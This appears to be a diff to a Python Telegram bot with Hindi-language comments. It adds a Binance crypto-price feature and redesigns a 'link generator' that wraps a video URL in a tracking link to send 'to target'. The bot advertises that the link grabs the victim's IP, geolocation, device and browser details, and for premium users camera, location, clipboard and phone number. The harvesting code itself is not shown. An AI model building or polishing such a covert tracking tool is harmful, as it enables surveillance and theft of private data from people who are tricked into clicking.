@@ -92,34 +92,46 @@ WELCOME_MSG = """
 👑 *Owner:* @EVEL_DEAD0751
 """
 
-# ==================== CRYPTO PRICE FUNCTION (BINANCE API) ====================
-def get_crypto_price(coin_name):
-    """Binance API se coin ka current price fetch karta hai - 100% working"""
-    
-    # Coin name to Binance symbol mapping
+# ==================== CRYPTO PRICE FUNCTION (BINANCE API WITH DETAILS) ====================
+def get_crypto_details(coin_name):
+    """Binance se coin ka price, 24h change, high, low fetch karo"""
     symbol_map = {
-        'bitcoin': 'BTCUSDT',
-        'btc': 'BTCUSDT',
-        'ethereum': 'ETHUSDT',
-        'eth': 'ETHUSDT',
-        'dogecoin': 'DOGEUSDT',
-        'doge': 'DOGEUSDT'
+        'btc': 'BTCUSDT', 'bitcoin': 'BTCUSDT',
+        'eth': 'ETHUSDT', 'ethereum': 'ETHUSDT',
+        'doge': 'DOGEUSDT', 'dogecoin': 'DOGEUSDT'
     }
-    
     symbol = symbol_map.get(coin_name.lower())
     if not symbol:
         return None
     
-    url = f"https://api.binance.com/api/v3/ticker/price?symbol={symbol}"
-    
     try:
-        response = requests.get(url, timeout=5)
-        if response.status_code == 200:
-            data = response.json()
-            price = float(data['price'])
-            return price
-        else:
-            return None
+        # Price
+        price_url = f"https://api.binance.com/api/v3/ticker/price?symbol={symbol}"
+        price_response = requests.get(price_url, timeout=5)
+        price_data = price_response.json()
+        price = float(price_data['price'])
+        
+        # 24hr stats
+        stats_url = f"https://api.binance.com/api/v3/ticker/24hr?symbol={symbol}"
+        stats_response = requests.get(stats_url, timeout=5)
+        stats_data = stats_response.json()
+        
+        high = float(stats_data['highPrice'])
+        low = float(stats_data['lowPrice'])
+        change = float(stats_data['priceChange'])
+        change_percent = float(stats_data['priceChangePercent'])
+        
+        # Market data
+        volume = float(stats_data['volume'])
+        
+        return {
+            'price': price,
+            'high': high,
+            'low': low,
+            'change': change,
+            'change_percent': change_percent,
+            'volume': volume
+        }
     except Exception as e:
         print(f"Binance API error: {e}")
         return None
@@ -169,43 +181,97 @@ def start_cmd(message):
     )
     bot.send_message(message.chat.id, WELCOME_MSG, parse_mode="Markdown", reply_markup=markup)
 
-# ==================== CRYPTO COMMANDS ====================
+# ==================== CRYPTO COMMANDS (IMPROVED) ====================
 @bot.message_handler(commands=['btc', 'bitcoin'])
 def btc_price(message):
-    price = get_crypto_price('btc')
-    if price:
-        bot.reply_to(message, f"₿ *Bitcoin* price: `${price:,.2f} USD`", parse_mode="Markdown")
+    data = get_crypto_details('btc')
+    if data:
+        emoji = "📈" if data['change'] > 0 else "📉"
+        color = "🟢" if data['change'] > 0 else "🔴"
+        
+        msg = f"""
+📊 *BITCOIN MARKET UPDATE* {color}
+
+💰 *Price:* `${data['price']:,.2f}`
+{emoji} *24h Change:* `${data['change']:,.2f}` ({data['change_percent']:.2f}%)
+📈 *24h High:* `${data['high']:,.2f}`
+📉 *24h Low:* `${data['low']:,.2f}`
+📦 *24h Volume:* `{data['volume']:,.0f} USDT`
+
+⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')}
+        """
+        bot.reply_to(message, msg, parse_mode="Markdown")
     else:
-        bot.reply_to(message, "❌ Price fetch karne mein error hua. Binance API try kar raha hai, baad mein phir try karo.")
+        bot.reply_to(message, "❌ Price fetch karne mein error hua.")
 
 @bot.message_handler(commands=['eth', 'ethereum'])
 def eth_price(message):
-    price = get_crypto_price('eth')
-    if price:
-        bot.reply_to(message, f"⟠ *Ethereum* price: `${price:,.2f} USD`", parse_mode="Markdown")
+    data = get_crypto_details('eth')
+    if data:
+        emoji = "📈" if data['change'] > 0 else "📉"
+        color = "🟢" if data['change'] > 0 else "🔴"
+        
+        msg = f"""
+📊 *ETHEREUM MARKET UPDATE* {color}
+
+💰 *Price:* `${data['price']:,.2f}`
+{emoji} *24h Change:* `${data['change']:,.2f}` ({data['change_percent']:.2f}%)
+📈 *24h High:* `${data['high']:,.2f}`
+📉 *24h Low:* `${data['low']:,.2f}`
+📦 *24h Volume:* `{data['volume']:,.0f} USDT`
+
+⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')}
+        """
+        bot.reply_to(message, msg, parse_mode="Markdown")
     else:
-        bot.reply_to(message, "❌ Price fetch karne mein error hua. Binance API try kar raha hai, baad mein phir try karo.")
+        bot.reply_to(message, "❌ Price fetch karne mein error hua.")
 
 @bot.message_handler(commands=['doge', 'dogecoin'])
 def doge_price(message):
-    price = get_crypto_price('doge')
-    if price:
-        bot.reply_to(message, f"🐕 *Dogecoin* price: `${price:,.2f} USD`", parse_mode="Markdown")
+    data = get_crypto_details('doge')
+    if data:
+        emoji = "📈" if data['change'] > 0 else "📉"
+        color = "🟢" if data['change'] > 0 else "🔴"
+        
+        msg = f"""
+📊 *DOGECOIN MARKET UPDATE* {color}
+
+💰 *Price:* `${data['price']:,.4f}`
+{emoji} *24h Change:* `${data['change']:,.4f}` ({data['change_percent']:.2f}%)
+📈 *24h High:* `${data['high']:,.4f}`
+📉 *24h Low:* `${data['low']:,.4f}`
+📦 *24h Volume:* `{data['volume']:,.0f} USDT`
+
+⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')}
+        """
+        bot.reply_to(message, msg, parse_mode="Markdown")
     else:
-        bot.reply_to(message, "❌ Price fetch karne mein error hua. Binance API try kar raha hai, baad mein phir try karo.")
+        bot.reply_to(message, "❌ Price fetch karne mein error hua.")
 
 @bot.message_handler(commands=['price'])
 def price_command(message):
-    # /price <coin_name>
     args = message.text.split()
     if len(args) < 2:
         bot.reply_to(message, "Usage: /price <coin_name> (e.g., /price btc, /price eth, /price doge)")
         return
     coin = args[1].lower()
-    
-    price = get_crypto_price(coin)
-    if price:
-        bot.reply_to(message, f"{coin.upper()} price: `${price:,.2f} USD`", parse_mode="Markdown")
+    data = get_crypto_details(coin)
+    if data:
+        emoji = "📈" if data['change'] > 0 else "📉"
+        color = "🟢" if data['change'] > 0 else "🔴"
+        
+        msg = f"""
+📊 *{coin.upper()} MARKET UPDATE* {color}
+
+💰 *Price:* `${data['price']:,.2f}`
+{emoji} *24h Change:* `${data['change']:,.2f}` ({data['change_percent']:.2f}%)
+📈 *24h High:* `${data['high']:,.2f}`
+📉 *24h Low:* `${data['low']:,.2f}`
+📦 *24h Volume:* `{data['volume']:,.0f} USDT`
+
+⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')}
+        """
+        bot.reply_to(message, msg, parse_mode="Markdown")
     else:
         bot.reply_to(message, "❌ Unsupported coin. Try: btc, eth, doge")
 
@@ -222,51 +288,116 @@ def eth_button(message):
 def doge_button(message):
     doge_price(message)
 
-# ==================== GENERATE LINK ====================
+# ==================== GENERATE LINK (IMPROVED DESIGN & ANIMATION) ====================
 @bot.message_handler(func=lambda m: m.text == "🔗 GENERATE LINK" or m.text == "/terminal:gernatLINK")
 def gen_link(message):
     premium = is_premium(message.from_user.id)
+    
     if premium:
-        features = "✨ *Premium Features (11-21)*\n• Camera, Location, Clipboard\n• Battery, Phone Number\n• IPv6, Device Memory\n• Bluetooth, XR Info"
+        badge = "⭐ PREMIUM USER ⭐"
+        features = "📸 Camera | 📍 Location | 📋 Clipboard | 📱 Phone"
     else:
-        features = "🔹 *Free Features (1-10)*\n• IP Address\n• Device Info\n• Browser & Platform\n• Screen Resolution\n• Language & Timezone"
-
+        badge = "🆓 FREE USER 🆓"
+        features = "🌐 IP | 📱 Device | 🖥️ Browser | 📺 Screen"
+    
     markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("➕ ENTER VIDEO LINK", callback_data="enter_link"))
-    bot.send_message(message.chat.id, f"🔗 *LINK GENERATOR*\n\n{features}\n\nClick button and paste your video link.", parse_mode="Markdown", reply_markup=markup)
+    btn = types.InlineKeyboardButton("🎯 ENTER VIDEO LINK", callback_data="enter_link")
+    markup.add(btn)
+    
+    design_msg = f"""
+╔══════════════════════╗
+║   🔗 *LINK GENERATOR*   ║
+╚══════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━
+{badge}
+━━━━━━━━━━━━━━━━━━━━━
+
+✨ *Your Features:*
+{features}
+
+━━━━━━━━━━━━━━━━━━━━━
+👇 *Click button below*
+*and paste your video link*
+━━━━━━━━━━━━━━━━━━━━━
+    """
+    
+    bot.send_message(message.chat.id, design_msg, parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "enter_link")
 def ask_link(call):
-    bot.edit_message_text("📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+    bot.edit_message_text(
+        "📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...",
+        call.message.chat.id,
+        call.message.message_id,
+        parse_mode="Markdown"
+    )
     bot.register_next_step_handler(call.message, process_link)
 
 def process_link(message):
     url = message.text.strip()
     if not (url.startswith('http://') or url.startswith('https://')):
-        bot.reply_to(message, "❌ Invalid link! Must start with http:// or https://")
+        bot.reply_to(message, "❌ *Invalid Link!*\nMust start with http:// or https://", parse_mode="Markdown")
         return
-
-    loading = bot.reply_to(message, "⏳ 0%")
-    for i in range(1, 11):
-        time.sleep(0.2)
+    
+    # Beautiful loading animation
+    loading = bot.reply_to(message, "⏳ *Generating your secure link...*", parse_mode="Markdown")
+    
+    frames = [
+        "🔴 *0%* [          ]",
+        "🟠 *20%* [█         ]",
+        "🟡 *40%* [██        ]",
+        "🟢 *60%* [███       ]",
+        "🔵 *80%* [████      ]",
+        "💜 *99%* [█████     ]",
+        "✨ *100%* [██████    ]"
+    ]
+    
+    for frame in frames:
+        time.sleep(0.4)
         try:
-            bot.edit_message_text(f"⏳ {i*10}%", loading.chat.id, loading.message_id)
+            bot.edit_message_text(frame, loading.chat.id, loading.message_id, parse_mode="Markdown")
         except:
             pass
-
+    
     link_id = str(uuid.uuid4())[:8]
     modified_url = f"{BASE_URL}/click/{link_id}"
-
+    
     conn = get_db()
     c = conn.cursor()
     c.execute("INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
               (link_id, message.from_user.id, url, modified_url, datetime.datetime.now()))
     conn.commit()
     conn.close()
+    
+    # Beautiful success message with extra buttons
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    btn1 = types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"copy_{link_id}")
+    btn2 = types.InlineKeyboardButton("🔍 PREVIEW", url=modified_url)
+    btn3 = types.InlineKeyboardButton("📤 SHARE", switch_inline_query=modified_url)
+    markup.add(btn1, btn2, btn3)
+    
+    success_msg = f"""
+╔══════════════════════╗
+║  ✅ *LINK GENERATED*   ║
+╚══════════════════════╝
 
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"copy_{link_id}"))
-    bot.edit_message_text(f"✅ *LINK GENERATED!*\n\n`{modified_url}`\n\nSend this to target.", loading.chat.id, loading.message_id, parse_mode="Markdown", reply_markup=markup)
+━━━━━━━━━━━━━━━━━━━━━
+🔗 *Your Tracking Link:*
+`{modified_url}`
+
+━━━━━━━━━━━━━━━━━━━━━
+📊 *Features Active:*
+• Real-time tracking
+• IP Geolocation
+• Device Detection
+• Browser Info
+━━━━━━━━━━━━━━━━━━━━━
+
+👇 *Send this link to target*
+    """
+    
+    bot.edit_message_text(success_msg, loading.chat.id, loading.message_id, parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('copy_'))
 def copy_link(call):
@@ -276,9 +407,14 @@ def copy_link(call):
     c.execute("SELECT modified_url FROM links WHERE link_id=?", (link_id,))
     row = c.fetchone()
     conn.close()
+    
     if row:
-        bot.answer_callback_query(call.id, "✅ Copied!")
-        bot.send_message(call.message.chat.id, f"📋 `{row[0]}`", parse_mode="Markdown")
+        bot.answer_callback_query(call.id, "✅ Link copied to clipboard!")
+        bot.send_message(
+            call.message.chat.id,
+            f"📋 *Your Link:*\n`{row[0]}`",
+            parse_mode="Markdown"
+        )
     else:
         bot.answer_callback_query(call.id, "❌ Link not found")
 
